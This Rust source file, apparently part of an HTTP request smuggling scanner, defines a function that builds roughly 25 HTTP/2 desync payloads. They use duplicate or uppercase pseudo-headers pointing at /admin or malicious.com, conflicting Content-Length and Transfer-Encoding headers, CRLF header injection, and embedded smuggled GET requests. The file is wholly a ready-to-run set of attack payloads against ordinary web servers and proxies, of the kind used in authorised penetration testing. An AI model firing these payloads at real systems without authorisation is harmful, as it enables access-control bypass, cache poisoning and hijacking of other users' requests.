use super::{format_cookies, format_custom_headers};

/// Generate H2 (HTTP/2 Protocol) smuggling attack payloads
/// HTTP/2 desync attacks exploit discrepancies in how front-end and back-end servers handle HTTP/2 features
/// Reference: https://portswigger.net/research/http2
pub fn get_h2_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::with_capacity(30);

    // === HTTP/2 Pseudo-Header Injection Attacks ===
    // These attacks exploit how servers handle duplicate or malformed pseudo-headers

    // Duplicate :method pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Duplicate :path pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :path: {}\r\n\
         :path: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, path
    ));

    // Duplicate :authority pseudo-header (similar to Host header in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Duplicate :scheme pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :scheme: https\r\n\
         :scheme: http\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Name with Colon Attacks ===
    // HTTP/2 allows colons in header names (as pseudo-headers), but HTTP/1.1 doesn't

    // Header name starting with colon (non-pseudo-header)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :custom-header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header name with colon in the middle
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x-custom:header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Content-Length Conflicts ===
    // HTTP/2 uses frame length, but some proxies still process Content-Length

    // Content-Length mismatch with smuggled request
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         Content-Length: 44\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Header Value with Newline Attacks ===
    // HTTP/2 doesn't allow newlines in header values, but HTTP/1.1 might accept them

    // Header value with embedded newline
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Header value with CRLF injection
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value1\r\nX-Injected: injected\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Transfer-Encoding (forbidden in HTTP/2) ===
    // HTTP/2 forbids Transfer-Encoding, but proxies might forward it to HTTP/1.1 backends

    // Transfer-Encoding in HTTP/2 context (should be rejected but might be smuggled)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Connection-Specific Headers (forbidden in HTTP/2) ===
    // HTTP/2 forbids connection-specific headers like Connection, Keep-Alive, etc.

    // Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: close\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Keep-Alive header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Keep-Alive: timeout=5\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Proxy-Connection header (forbidden in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Proxy-Connection: keep-alive\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Case Sensitivity Attacks ===
    // HTTP/2 requires lowercase header names, HTTP/1.1 is case-insensitive

    // Mixed-case pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :Method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Uppercase pseudo-header (invalid in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :PATH: /admin\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Header Field Ordering Attacks ===
    // HTTP/2 requires pseudo-headers before regular headers

    // Regular header before pseudo-header (violates HTTP/2 spec)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         :method: POST\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Header Name Validation Bypass ===
    // Test characters that are valid in HTTP/2 but not in HTTP/1.1

    // Header name with underscore (more permissive in HTTP/2)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         x_custom_header: value\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // === Content-Length: 0 with Body ===
    // HTTP/2 uses frame length, so Content-Length: 0 with body might be processed differently

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         unexpected body content",
        method, path, host, custom_header_str, cookie_str
    ));

    // === HTTP/2 Downgrade with Smuggled Request ===
    // Attack that exploits HTTP/2 to HTTP/1.1 downgrade

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Request Splitting via Header Injection ===
    // Inject full request in header value

    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         X-Custom: value\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Host: {}\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str, host
    ));

    // === Additional HTTP/2 Specific Attacks ===

    // HTTP/2 with multiple pseudo-headers of different types
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: GET\r\n\
         :path: /admin\r\n\
         :authority: malicious.com\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Transfer-Encoding with pseudo-header (combining forbidden elements)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :method: POST\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // Pseudo-header after body (severe HTTP/2 violation)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Content-Length: 0\r\n\
         \r\n\
         :path: /injected",
        method, path, host, custom_header_str, cookie_str
    ));

    // Multiple Content-Length with pseudo-header
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         :authority: {}\r\n\
         Content-Length: 10\r\n\
         Content-Length: 0\r\n\
         \r\n\
         smuggled",
        method, path, host, custom_header_str, cookie_str, host
    ));

    payloads
}
